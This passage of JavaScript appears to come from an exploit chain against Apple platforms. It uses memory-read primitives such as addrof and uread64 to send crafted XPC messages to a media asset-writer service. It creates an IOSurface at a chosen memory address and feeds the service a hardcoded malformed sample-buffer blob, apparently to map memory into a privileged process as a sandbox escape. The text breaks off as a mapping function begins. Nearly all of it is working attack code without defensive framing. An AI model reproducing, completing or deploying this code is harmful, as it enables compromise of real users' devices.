  let sample_buffer_data = new Uint8Array([0x84, 0x6, 0x0, 0x0, 0x66, 0x75, 0x62, 0x73, 0x8, 0x2, 0x0, 0x0, 0x74, 0x61, 0x64, 0x73, 0xb4, 0x97, 0xc7, 0x25, 0x0, 0xbb, 0xd9, 0x7, 0x4, 0xa6, 0x8f, 0x43, 0x90, 0x90, 0xdd, 0xc4, 0xd1, 0xdc, 0x6d, 0x79, 0xb6, 0x44, 0x1c, 0xea, 0xa7, 0xe6, 0x5e, 0x1d, 0x11, 0x68, 0x27, 0x59, 0xa2, 0x51, 0xde, 0x7e, 0x32, 0xc5, 0x62, 0x93, 0x11, 0xe2, 0xed, 0x44, 0xb9, 0xa2, 0xe8, 0x73, 0x1, 0x24, 0x94, 0x80, 0x20, 0xc1, 0x9f, 0x5, 0xd3, 0x35, 0xf0, 0xc9, 0x62, 0x7c, 0xfb, 0xa7, 0x32, 0xe7, 0x8c, 0x5f, 0x56, 0xf7, 0x8e, 0x8d, 0xb4, 0x3e, 0x45, 0xe0, 0xf3, 0x81, 0xfa, 0x96, 0x4c, 0xd7, 0xa8, 0x33, 0x61, 0x7e, 0x8, 0x22, 0xe9, 0x9e, 0x5c, 0x52, 0xfe, 0xcb, 0x51, 0x17, 0x6a, 0xa4, 0xe, 0xe7, 0xd, 0x84, 0xd1, 0x8b, 0x33, 0xce, 0xed, 0xae, 0xcc, 0xbe, 0x84, 0xfe, 0x38, 0x7f, 0x9a, 0x96, 0xfa, 0x7c, 0x7b, 0xc, 0xd6, 0x1e, 0x84, 0xd4, 0x87, 0xcb, 0x80, 0xd2, 0x9f, 0xe9, 0x5c, 0x61, 0x1f, 0x5a, 0x96, 0xff, 0x3a, 0xd, 0x4, 0x1c, 0x99, 0x86, 0x47, 0xb1, 0xfe, 0x42, 0x52, 0x1f, 0xe0, 0x50, 0x17, 0x64, 0xaf, 0x92, 0x7, 0xe3, 0x88, 0x7a, 0x19, 0x1a, 0x47, 0x16, 0x60, 0x51, 0x1, 0xea, 0x66, 0x50, 0x86, 0xda, 0x2c, 0x4c, 0x46, 0x56, 0xbb, 0x7d, 0xf7, 0x51, 0x76, 0xf7, 0xff, 0xc, 0x9b, 0x7e, 0x84, 0x66, 0xed, 0x74, 0x5e, 0x5a, 0x1, 0xae, 0xa4, 0xb2, 0x7, 0x17, 0x0, 0xac, 0xa0, 0x21, 0xf0, 0xdf, 0x26, 0x24, 0x16, 0x80, 0xaf, 0x1, 0x8d, 0x8b, 0x90, 0x83, 0x13, 0x61, 0x1c, 0x35, 0x6d, 0x5c, 0xcc, 0xf9, 0x45, 0xc8, 0xdd, 0xf, 0x74, 0xb2, 0x82, 0x7a, 0xf6, 0xda, 0x4b, 0xe, 0xa, 0x1, 0xda, 0x63, 0x27, 0xf0, 0x90, 0x3f, 0xa1, 0x4b, 0x41, 0x1d, 0x73, 0xa, 0xbf, 0x30, 0x88, 0x23, 0x97, 0x53, 0x9f, 0x55, 0xf6, 0x15, 0x58, 0x2a, 0x26, 0x4c, 0x74, 0xb, 0xe7, 0x95, 0xc6, 0x64, 0x4a, 0x6e, 0xd1, 0xf0, 0x53, 0x26, 0x61, 0xac, 0x47, 0x73, 0x38, 0x30, 0x5e, 0x62, 0xc0, 0xe3, 0x3, 0x0, 0x7a, 0x7a, 0xb7, 0xb8, 0xa7, 0xae, 0xd2, 0xf4, 0x6, 0x90, 0x7, 0x81, 0xd0, 0xe2, 0xa4, 0x7d, 0xdd, 0x7f, 0x94, 0x82, 0xac, 0xb, 0x43, 0xff, 0x67, 0xff, 0xc7, 0xa5, 0xf1, 0x28, 0x5a, 0x58, 0xd0, 0xcc, 0x16, 0xec, 0xc1, 0x1e, 0xc2, 0x37, 0x5b, 0xe5, 0xa2, 0x6c, 0xfe, 0x93, 0xb9, 0x70, 0x44, 0x71, 0xe9, 0x4c, 0x2f, 0xfb, 0x66, 0xe4, 0xae, 0x2a, 0x72, 0x39, 0xff, 0xc7, 0x1, 0xea, 0xa4, 0x69, 0x59, 0x43, 0x31, 0x1c, 0xbd, 0xa3, 0x8d, 0x5b, 0x9b, 0x55, 0x24, 0x64, 0xb1, 0x8a, 0x6f, 0x7f, 0x4d, 0x74, 0x9a, 0xc7, 0x5b, 0xf4, 0x85, 0x26, 0xb0, 0xc5, 0x3, 0x41, 0x43, 0x62, 0xc7, 0xae, 0x60, 0x9b, 0x32, 0xdf, 0xbf, 0xca, 0xf4, 0x44, 0xc6, 0xf, 0xff, 0x4, 0xe1, 0x39, 0x2b, 0x1, 0x10, 0x8b, 0xf1, 0xea, 0xb6, 0x3b, 0xfb, 0x2d, 0xa9, 0x1e, 0x7c, 0x5a, 0xdb, 0x63, 0x78, 0xa2, 0xd9, 0x97, 0x34, 0x92, 0x0, 0x5c, 0xdc, 0xdf, 0x18, 0x2d, 0x31, 0xb5, 0xb3, 0xe, 0x12, 0x82, 0x15, 0xe0, 0x95, 0x95, 0xcc, 0xe8, 0x54, 0x28, 0xdf, 0x6b, 0x69, 0x6e, 0x0, 0xc8, 0xb2, 0xf7, 0x4d, 0xea, 0xcb, 0x84, 0x20, 0x2b, 0x2c, 0xcc, 0x3f, 0x17, 0xfa, 0x7b, 0xc, 0xeb, 0xbf, 0x48, 0xd9, 0xf5, 0xb8, 0xd7, 0xa1, 0x96, 0x2e, 0x24, 0x7a, 0xda, 0x6, 0x29, 0xb6, 0x3d, 0xb9, 0xd1, 0xfc, 0x14, 0x7f, 0x6e, 0x87, 0xe3, 0x12, 0x48, 0x56, 0x39, 0x1c, 0x82, 0xf2, 0x88, 0x7f, 0xa5, 0xb3, 0x24, 0x33, 0x70, 0xc8, 0x1e, 0xe, 0x23, 0x89, 0x38, 0x38, 0x74, 0xc9, 0x60, 0xfe, 0x24, 0x55, 0xf6, 0x9, 0x0, 0x0, 0x0, 0x64, 0x73, 0x6f, 0x69, 0x0, 0x50, 0x0, 0x0, 0x0, 0x61, 0x69, 0x74, 0x73, 0xd, 0x4f, 0x38, 0x5, 0x0, 0x0, 0x0, 0x0, 0x8d, 0x30, 0x49, 0xe8, 0x1, 0x0, 0x0, 0x0, 0x45, 0x79, 0x9e, 0x79, 0x0, 0x0, 0x0, 0x0, 0x37, 0x88, 0xb7, 0xf, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x4c, 0x6d, 0xb, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x8f, 0x98, 0x9, 0x0, 0x0, 0x0, 0x0, 0xbc, 0xc3, 0xc3, 0x70, 0x0, 0x0, 0x0, 0x0, 0x40, 0xbb, 0x73, 0x2e, 0x1, 0x0, 0x0, 0x0, 0x80, 0x2, 0x4d, 0x17, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0xa2, 0x55, 0x81, 0xef, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x47, 0x8a, 0x5, 0xc2, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x86, 0x72, 0xed, 0x67, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x73, 0x60, 0xd5, 0xf, 0x9b, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0x3f, 0x0, 0x0, 0x0, 0x6c, 0x6e, 0x68, 0x63, 0x81, 0x97, 0x8c, 0xcb, 0x2a, 0x6, 0xff, 0x69, 0xce, 0xa9, 0x10, 0xf0, 0x3d, 0x55, 0x7f, 0xf0, 0x4a, 0x6f, 0x3a, 0xb4, 0x9d, 0xd3, 0xe1, 0x55, 0xe9, 0x8, 0x3f, 0x91, 0x10, 0x5d, 0x65, 0xd0, 0x32, 0x1f, 0x90, 0xe9, 0xde, 0xb5, 0x79, 0xd3, 0x35, 0x20, 0xdf, 0xbe, 0xdf, 0x73, 0x7f, 0x4b, 0x1, 0xfe, 0x9a, 0xb5, 0xfd, 0x2a, 0x68, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x64, 0x88, 0x49, 0x89, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0xde, 0xc2, 0xf2, 0xe9, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x3e, 0xc0, 0x1, 0xca, 0x51, 0xa, 0xba, 0x88, 0x4b, 0x83, 0x90, 0xee, 0x6e, 0x8b, 0xd1, 0x33, 0x14, 0x15, 0x78, 0x3f, 0xe4, 0xf6, 0xaa, 0xab, 0x56, 0x4e, 0x2b, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xd4, 0x8d, 0x8a, 0x99, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0x9d, 0x5f, 0x9f, 0x2a, 0x8, 0x1, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0xa9, 0x78, 0xbd, 0xb0, 0x0, 0x0, 0x0, 0x0, 0x99, 0x58, 0x2, 0x8a, 0xd7, 0x6e, 0x43, 0x62, 0xd9, 0x7a, 0xc2, 0x1f, 0x40, 0x96, 0x3c, 0x7b, 0xdb, 0xf5, 0xaf, 0x18, 0x42, 0xc8, 0x37, 0x9, 0xda, 0x6e, 0x10, 0x8, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x61, 0x69, 0x64, 0x6d, 0x65, 0x64, 0x69, 0x76, 0xe, 0x0, 0x0, 0x0, 0x6c, 0x6e, 0x68, 0x63, 0xb6, 0x6d, 0xe8, 0xc0, 0xf3, 0x69, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x4c, 0x79, 0xff, 0x16, 0x0, 0x0, 0x0, 0x0, 0x53, 0x6e, 0xbf, 0xd5, 0xa1, 0xbc, 0x2, 0x23, 0x1b, 0x26, 0x89, 0xf0, 0xb7, 0xe4, 0xa, 0xb1, 0x8e, 0xd5, 0x1a, 0x1a, 0x37, 0xe5, 0x0, 0x4, 0x75, 0xc8, 0xbf, 0x48, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x6d, 0x69, 0x64, 0x76, 0xf1, 0x40, 0x7b, 0x30, 0x91, 0xc6, 0x6f, 0x8, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0x23, 0xd9, 0x2a, 0xa9, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0xc4, 0x3c, 0xe5, 0x70, 0x2e, 0x0, 0x0, 0x0, 0x69, 0x6b, 0x75, 0x63, 0x5e, 0x27, 0x87, 0x5a, 0xd8, 0x83, 0xb2, 0xa4, 0x49, 0xe0, 0x4c, 0x42, 0x60, 0x66, 0xcd, 0xe2, 0x9, 0xc3, 0xb8, 0x3c, 0x1b, 0x9b, 0x7a, 0xa4, 0x84, 0xe5, 0x72, 0xe8, 0x75, 0xfe, 0x95, 0xe8, 0x10, 0x80, 0xff, 0xcd, 0x27, 0x9d, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x1f, 0xf2, 0x4b, 0xea, 0x0, 0x0, 0x0, 0x0, 0xc9, 0x4f, 0x84, 0x27, 0xfe, 0xff, 0xff, 0xff, 0x52, 0xfe, 0xbf, 0xb6, 0x78, 0x26, 0x31, 0x3e, 0x79, 0x5c, 0x50, 0xbe, 0x33, 0xd1, 0x8f, 0x35, 0xc2, 0x4d, 0xab, 0xf9, 0x0, 0x0, 0x0, 0x0, 0x44, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xea, 0x39, 0x7e, 0xed, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x1d, 0xa1, 0x89, 0x83, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0x7c, 0x94, 0x1f, 0x5, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x70, 0x63, 0x6c, 0x63, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xbb, 0x5e, 0xcf, 0x11, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x53, 0xe, 0xe6, 0xf, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0xfa, 0xa0, 0x8d, 0x80, 0xc5, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x94, 0x5a, 0xa3, 0x7d, 0x33, 0x0, 0x0, 0x0, 0x69, 0x6b, 0x75, 0x63, 0x5c, 0xb, 0x95, 0x31, 0x4b, 0x6b, 0x98, 0xb9, 0xf0, 0x22, 0xba, 0xc0, 0x13, 0x87, 0x4c, 0xa7, 0x2a, 0x7c, 0xd9, 0x64, 0xf0, 0x94, 0xaa, 0x16, 0x97, 0x81, 0xed, 0xb2, 0x14, 0xf0, 0xff, 0xb5, 0x13, 0x73, 0x80, 0xcd, 0x5f, 0x4, 0x8f, 0x62, 0x6, 0xc5, 0xca, 0x10, 0x0, 0x0, 0x0, 0x6d, 0x69, 0x64, 0x76, 0x2d, 0x89, 0x78, 0x57, 0xad, 0x51, 0x91, 0x14, 0xc, 0x0, 0x0, 0x0, 0x67, 0x66, 0x63, 0x74, 0xae, 0xdc, 0x39, 0xbe, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x74, 0x63, 0x69, 0x70, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x66, 0xbf, 0xc0, 0xfc, 0x3e, 0x0, 0x0, 0x0, 0x69, 0x6b, 0x75, 0x63, 0x1d, 0x2d, 0x81, 0xbd, 0x24, 0xa5, 0x40, 0xf8, 0x9f, 0x84, 0xfb, 0x77, 0x71, 0x1f, 0x1, 0x4c, 0x4b, 0xa0, 0xdd, 0x58, 0x5, 0x0, 0xd8, 0x45, 0xde, 0xf9, 0xae, 0x16, 0x1, 0x70, 0x33, 0x49, 0xe6, 0xf1, 0xcb, 0x31, 0xa9, 0xfb, 0xa1, 0x0, 0xb8, 0xe5, 0x0, 0x81, 0x2e, 0x48, 0x61, 0xa2, 0xe1, 0xc9, 0x5, 0x74, 0xfe, 0xc5, 0xc, 0x0, 0x0, 0x0, 0x61, 0x69, 0x64, 0x6d, 0x61, 0x74, 0x65, 0x6d, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x72, 0x26, 0xed, 0x7b, 0x5c, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x76, 0x78, 0x75, 0x61, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xe2, 0x8d, 0x1b, 0x53, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x65, 0x64, 0x69, 0x76, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x93, 0xc4, 0xbc, 0x48, 0x0, 0x0, 0x0, 0x0, 0x55, 0xb8, 0xec, 0x1a, 0x49, 0xb6, 0x7e, 0x70, 0xc2, 0x85, 0xdc, 0xa6, 0x95, 0xd4, 0xaf, 0x9d, 0xcd, 0xfc, 0x8b, 0x3f, 0xd4, 0xf9, 0x28, 0x5e, 0x2b, 0x97, 0xd4, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xb3, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x68, 0x89, 0x8, 0xe1, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0xb2, 0x32, 0xc6, 0xed, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x5f, 0xcb, 0x69, 0x3b, 0x26, 0xfd, 0x6b, 0x49, 0x83, 0xa8, 0x18, 0x8c, 0x96, 0xa5, 0xa, 0x86, 0xc5, 0x19, 0x78, 0xa3, 0x9f, 0x89, 0x6f, 0x6b, 0x30, 0xc1, 0xa4, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0xac, 0x3b, 0xbf, 0xdd, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x6e, 0x75, 0x6f, 0x73, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x65, 0x64, 0x69, 0x76, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x20, 0x79, 0x3c, 0x20, 0x0, 0x0, 0x0, 0x0, 0xfd, 0xa2, 0x8a, 0xf9, 0xd0, 0xf4, 0x9b, 0xef, 0x81, 0xab, 0xae, 0xba, 0x88, 0xeb, 0xc7, 0x9c, 0x3e, 0xf1, 0x3f, 0x52, 0x22, 0xaa, 0xb9, 0x2, 0x2a, 0x9d, 0xae, 0xb4, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x6d, 0x69, 0x64, 0x76, 0x11, 0x14, 0xab, 0xb7, 0xe7, 0x4, 0x9d, 0x47, 0xb, 0x0, 0x0, 0x0, 0x6c, 0x6e, 0x68, 0x63, 0x81, 0xb5, 0x49]);
  let sample_buffer_data_ptr = wc_uread64(addrof(sample_buffer_data) + 0x10n);
  let sample_buffer_data_size = BigInt(sample_buffer_data.length);
  if (integrated) {
    sample_buffer_data_ptr = gpuCopyBuffer(sample_buffer_data_ptr, sample_buffer_data_size);
  }
  LOG(`sample_buffer_data_ptr: ${sample_buffer_data_ptr.hex()}`);
  LOG(`sample_buffer_data_size: ${sample_buffer_data_size.hex()}`);
  let XPC_MESSAGE_VALUE_OPCODE_SERVER_HANDLE_SET_TIMEOUT = 0x12E746F21n;
  let XPC_MESSAGE_VALUE_OPCODE_SERVER_DISASSOCIATE_OBJECT_WITH_CONNECTION = 0x12E6E6370n;
  let XPC_MESSAGE_VALUE_OPCODE_ASSET_CREATE_WITH_BLOCKBUFFER = 0x63724242n;
  let XPC_MESSAGE_VALUE_OPCODE_ASSET_LOAD_VALUE_ASYNC_FOR_PROPERTY = 0x6C6F6431n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_CREATE_WITH_ASSET = 0x6D727461n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_ADD_AUDIO_TRACK_WITH_PRESET = 0x6D726170n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_ADD_VIDEOCOMPOSITION_TRACK = 0x6D617663n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_START_OUTPUT = 0x6D72736Fn;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_CREATE_WITH_URL = 0x77727775n;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_NATIVE_TRACK = 0x77616E74n;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_BEGIN_SESSION = 0x77726273n;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_SAMPLE_BUFFER = 0x77726173n;
  let XPC_MESSAGE_KEY_OPCODE = ".Operation";
  let XPC_MESSAGE_KEY_OBJECT_ID = ".objectID";
  let XPC_MESSAGE_KEY_TRACK_ID_OUT = "TrackIDOut";
  let XPC_MESSAGE_KEY_ERROR_RETURN = ".ErrorReturn";
  let XPC_MESSAGE_KEY_BB_DATA = "BlockBufferData";
  let XPC_MESSAGE_KEY_FORMAT_IDENTIFIER_TYPE = "FormatIdentifierType";
  let XPC_MESSAGE_KEY_FORMAT_IDENTIFIER = "FormatIdentifier";
  let XPC_MESSAGE_KEY_PROPERTY_NAME = ".PropertyName";
  let XPC_MESSAGE_KEY_ASSET_TOKEN = "AssetToken";
  let XPC_MESSAGE_KEY_DEST_URL = "DestURL";
  let XPC_MESSAGE_KEY_SANDBOX_REGISTRATION_FOR_DEST_URL = "SandboxRegistrationForDestURL";
  let XPC_MESSAGE_KEY_SANDBOX_REGISTRATION_FOR_TEMP_DIR_URL = "SandboxRegistrationForTempDirURL";
  let XPC_MESSAGE_KEY_FORMAT_WRITER_OPTIONS = "FormatWriterOptions";
  let XPC_MESSAGE_KEY_REMAKER_OPTIONS = "RemakerOptions";
  let XPC_MESSAGE_KEY_MEDIA_TYPE = "MediaType";
  let XPC_MESSAGE_KEY_TIME = "Time";
  let XPC_MESSAGE_KEY_IOSURFACE = "IOSurface";
  let XPC_MESSAGE_KEY_SAMPLE_BUFFER = "SampleBuffer";
  let XPC_MESSAGE_KEY_TRACK_ID = "TrackID";
  let XPC_MESSAGE_KEY_AUDIO_PRESET_NAME = "AudioPresetName";
  let XPC_MESSAGE_KEY_AUDIO_PROCESSING_OPTIONS = "AudioProcessingOptions";
  function writer_add_sample_buffer_payload(writer, track, surface) {
    let payload = xpc_dictionary_create_empty();
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_SAMPLE_BUFFER);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let writer_id = xpc_uint64_create(writer.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OBJECT_ID, writer_id);
    xpc_release(writer_id);
    let track_id = xpc_int64_create(track.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_TRACK_ID, track_id);
    xpc_release(track_id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_IOSURFACE, surface);
    xpc_release(surface);
    let bb_data = xpc_data_create(sample_buffer_data_ptr, sample_buffer_data_size);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_SAMPLE_BUFFER, bb_data);
    xpc_release(bb_data);
    return payload;
  }
  function writer_add_sample_buffer(connection, writer, track, surface) {
    let payload = writer_add_sample_buffer_payload(writer, track, surface);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    let er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      return er;
    }
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function create_bundle(path) {
    if (typeof path === "string") {
      path = get_cstring(path);
    }
    let bundle = xpc_dictionary_create_empty();
    let uuid = xpc_uuid_create(new Uint8Array([0xC3, 0x85, 0x3D, 0xCC, 0x97, 0x76, 0x41, 0x14, 0xB6, 0xC1, 0xFD, 0x9F, 0x51, 0x94, 0x4A, 0x6D]));
    xpc_dictionary_set_value(bundle, "com.apple.CFURL.magic", uuid);
    xpc_release(uuid);
    let path_string = xpc_string_create(path);
    xpc_dictionary_set_value(bundle, "com.apple.CFURL.string", path_string);
    xpc_release(path_string);
    xpc_dictionary_set_value(bundle, "com.apple.CFURL.base", xpc_null_create());
    return bundle;
  }
  function writer_create_with_url_payload(writer_path) {
    if (writer_path && typeof writer_path === "string") {
      writer_path = get_cstring(writer_path);
    }
    let payload = xpc_dictionary_create_empty();
    let XPC_MESSAGE_VALUE_OPCODE_WRITER_CREATE_WITH_FRAGMENTED_DATA = 0x77776664n;
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_CREATE_WITH_FRAGMENTED_DATA);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let format_writer_options = xpc_dictionary_create_empty();
    xpc_dictionary_set_value(format_writer_options, "FileFormat", xpc_string_create("3GPFamily"));
    let remaker_options = xpc_dictionary_create_empty();
    xpc_dictionary_set_value(remaker_options, "AssetWriter_FastStart", xpc_bool_create(1n));
    let tmp_bundle = create_bundle("/tmp");
    xpc_dictionary_set_value(remaker_options, "Remaker_TemporaryDirectoryURL", tmp_bundle);
    xpc_release(tmp_bundle);
    let str = xpc_string_create("xxx");
    xpc_dictionary_set_value(remaker_options, "Remaker_InterimAssetName", str);
    xpc_release(str);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_FORMAT_WRITER_OPTIONS, format_writer_options);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_REMAKER_OPTIONS, remaker_options);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_SANDBOX_REGISTRATION_FOR_DEST_URL, xpc_uint64_create(2n));
    return payload;
  }
  function writer_create_with_url(connection, writer, writer_path) {
    let payload = writer_create_with_url_payload(writer_path);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      LOG(`[!] writer_create_with_url failed: ${er.hex()}`);
      return er;
    }
    let id = xpc_dictionary_get_uint64(reply, XPC_MESSAGE_KEY_OBJECT_ID);
    writer.id = id;
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function writer_add_native_track_payload(writer, media_type) {
    let payload = xpc_dictionary_create_empty();
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_NATIVE_TRACK);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let writer_id = xpc_uint64_create(writer.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OBJECT_ID, writer_id);
    xpc_release(writer_id);
    let xpc_media_type = xpc_int64_create(media_type);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_MEDIA_TYPE, xpc_media_type);
    xpc_release(xpc_media_type);
    return payload;
  }
  function writer_add_native_track(connection, writer, media_type, track) {
    let payload = writer_add_native_track_payload(writer, media_type);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      LOG(`[!] writer_add_native_track failed: ${er.hex()}`);
      return er;
    }
    let id = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_TRACK_ID_OUT);
    track.id = id;
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function surface_create_with_address(address, size) {
    let dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let cf_number = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(size));
    res = CFDictionarySetValue(dict, kIOSurfaceAllocSize, cf_number);
    let surface_width_height = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(0x10n));
    let surface_element_width = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(0xFFn));
    let surface_pixel = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(0x68646973n));
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, new_uint64_t(address));
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceWidth")), surface_width_height);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceHeight")), surface_width_height);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceElementWidth")), surface_element_width);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfacePixelFormat")), surface_pixel);
    let surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == 0n) {
      LOG("[!] Failed to create surface!!!");
      exit(0n);
    }
    return surface;
  }
  function writer_begin_session_payload(writer, time) {
    let payload = xpc_dictionary_create_empty();
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_BEGIN_SESSION);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let writer_id = xpc_uint64_create(writer.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OBJECT_ID, writer_id);
    xpc_release(writer_id);
    let time_buffer_size = BigInt(time.length);
    let time_buffer_ptr = wc_uread64(addrof(time) + 0x10n);
    if (integrated) {
      time_buffer_ptr = gpuCopyBuffer(time_buffer_ptr, time_buffer_size);
    }
    let time_data = xpc_data_create(time_buffer_ptr, time_buffer_size);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_TIME, time_data);
    xpc_release(time_data);
    return payload;
  }
  function writer_begin_session(connection, writer, time) {
    let payload = writer_begin_session_payload(writer, time);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    let er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      return er;
    }
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function create_iosurface(surface_size) {
    let surface_address_ptr = new_uint64_t(0n);
    kr = mach_vm_allocate(mach_task_self(), surface_address_ptr, surface_size, VM_FLAGS_ANYWHERE);
    if (kr != 0n) {
      LOG("[!] error: failed to allocate surface mapping!");
      return kr;
    }
    surface_address = uread64(surface_address_ptr);
    LOG(`surface_address: ${surface_address.hex()}`);
    LOG(`surface_size: ${surface_size.hex()}`);
    let surface = surface_create_with_address(surface_address, surface_size);
    return surface;
  }

  let remaker_connection = null;

  function map_iosurface(surface) {
    let writer = {};
    let surface_address = 0n;
    let surface_port = 0n;
    let surface_id = 0n;
    let surface_track_id = 0n;
